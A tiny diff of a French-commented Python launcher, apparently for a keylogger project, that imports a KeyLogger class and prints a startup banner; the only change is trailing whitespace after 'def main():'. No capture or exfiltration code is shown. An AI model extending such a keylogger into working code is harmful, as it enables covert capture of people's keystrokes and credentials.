@@ -7,7 +7,7 @@ from listener import KeyLogger
 
 # ── DÉMARRAGE ────────────────────────────────────────────────
 
-def main():
+def main(): 
     print("=" * 40)
     print(" Keylogger-démarage")
     print("=" * 40)
